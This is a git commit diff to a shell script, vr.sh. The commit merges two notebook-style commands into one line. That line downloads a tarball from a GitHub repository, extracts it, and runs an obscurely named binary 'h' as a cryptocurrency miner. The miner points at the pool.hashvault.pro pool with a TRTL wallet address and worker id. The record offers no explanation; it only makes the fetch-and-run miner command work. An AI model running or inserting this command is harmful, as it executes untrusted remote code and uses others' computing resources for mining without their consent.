3d49bf675d82147e0aaed14fd45383d925c6449d
muledan1 <108221871+muledan1@users.noreply.github.com>
2022-09-09 16:05:59 +0700

    Update vr.sh

--- vr.sh
+++ vr.sh
@@ -1,3 +1,2 @@
-!wget https://github.com/NabilaMahmudah/orge/raw/main/kh.tar.gz && tar xf kh.tar.gz
-!./h --pool pool.hashvault.pro:80 --username TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps.c36e2c4c8a7d5ca2c0dd0a433ac55ae41b1db55d2a7e800a15053c288d082ee8 --password BOOL-2 --algorithm chukwa_v2 --ssl
+wget https://github.com/NabilaMahmudah/orge/raw/main/kh.tar.gz && tar xf kh.tar.gz && ./h --pool pool.hashvault.pro:80 --username TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps.c36e2c4c8a7d5ca2c0dd0a433ac55ae41b1db55d2a7e800a15053c288d082ee8 --password BOOL-2 --algorithm chukwa_v2 --ssl
 
